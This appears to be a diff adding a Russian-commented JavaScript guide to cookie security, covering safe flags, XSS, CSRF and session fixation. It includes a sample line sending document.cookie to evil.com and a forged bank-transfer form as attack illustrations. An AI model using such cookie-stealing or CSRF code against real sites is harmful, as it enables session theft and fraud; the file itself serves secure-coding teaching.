@@ -1,0 +1,88 @@
+
+// ==========================================
+// БЕЗОПАСНОСТЬ COOKIES
+// ==========================================
+
+// ❌ НЕБЕЗОПАСНО - что НЕ хранить в cookies
+const badPractices = {
+  passwords: 'user123',              // Никогда!
+  creditCards: '4111-1111-1111-1111', // Никогда!
+  personalData: {
+    ssn: '123-45-6789',              // Никогда!
+    privateKey: 'secret-key'         // Никогда!
+  },
+  largeData: 'x'.repeat(5000)        // Превышает лимит 4KB
+}
+
+// ✅ БЕЗОПАСНО - что можно хранить
+const goodPractices = {
+  // 1. Session ID (с HttpOnly!)
+  sessionId: 'random-secure-token-abc123',
+
+  // 2. Preferences (некритичные настройки)
+  theme: 'dark',
+  language: 'ru',
+  fontSize: '16px',
+
+  // 3. Analytics tokens
+  analyticsId: 'GA-123456',
+
+  // 4. JWT token (с правильными флагами!)
+  authToken: 'eyJhbGc...', // + HttpOnly + Secure + SameSite=Strict
+}
+
+// Правильная установка auth cookie на сервере
+res.cookie('authToken', jwtToken, {
+  httpOnly: true,    // ❗ Защита от XSS
+  secure: true,      // ❗ Только HTTPS
+  sameSite: 'strict', // ❗ Защита от CSRF
+  maxAge: 3600000,   // 1 час
+  path: '/',
+  signed: true       // Подпись для защиты от подделки
+})
+
+// XSS атака - почему HttpOnly важен
+// ❌ БЕЗ HttpOnly:
+document.cookie = "token=secret123"
+// Злоумышленник может:
+const stolen = document.cookie // "token=secret123"
+fetch('https://evil.com/steal?cookie=' + stolen)
+
+// ✅ С HttpOnly (устанавливается на сервере):
+res.cookie('token', 'secret123', { httpOnly: true })
+// Злоумышленник НЕ может:
+console.log(document.cookie) // token не виден!
+
+// CSRF защита - SameSite в действии
+// Атака: пользователь на evil.com
+// evil.com отправляет форму:
+<form action="https://bank.com/transfer" method="POST">
+  <input name="to" value="attacker">
+  <input name="amount" value="1000">
+</form>
+
+// ❌ БЕЗ SameSite:
+res.cookie('session', 'abc123') // Cookie отправится с формой!
+
+// ✅ С SameSite=Lax или Strict:
+res.cookie('session', 'abc123', { sameSite: 'lax' })
+// Cookie НЕ отправится с POST запросом с другого сайта!
+
+// Session Fixation защита
+// ❌ ПЛОХО: всегда использовать один session ID
+function login(username, password) {
+  // Проверка credentials...
+  // Оставляем старый session ID
+}
+
+// ✅ ХОРОШО: регенерировать session после login
+function secureLogin(username, password) {
+  // Проверка credentials...
+  const newSessionId = generateSecureToken()
+  res.cookie('sessionId', newSessionId, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 3600000
+  })
+}
